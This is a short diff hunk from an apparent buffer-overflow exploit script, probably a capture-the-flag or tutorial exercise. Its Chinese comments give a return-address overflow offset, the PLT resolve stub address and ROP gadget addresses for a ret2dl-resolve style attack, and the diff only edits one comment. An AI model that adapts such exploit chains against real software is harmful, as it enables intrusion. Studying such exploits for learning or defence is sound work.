@@ -824,7 +824,7 @@ def leak_info(name, addr):
 # 准备好如下值
 offset = 0x108  # 溢出到返回值的偏移
 read_length = 0x180  # 表示漏洞程序的read允许读的长度
-start_resolve = 0x401020 # read函数的plt表的push和jmp操作的地址
+start_resolve = 0x401020 # 所有函数的plt表的push和jmp操作的地址，如 push cs:qword_404008 jmp cs:qword_404010
 read_plt = elf.plt['read']
 pop_rdi = 0x4011d3
 pop_rsi_r15 = 0x4011d1
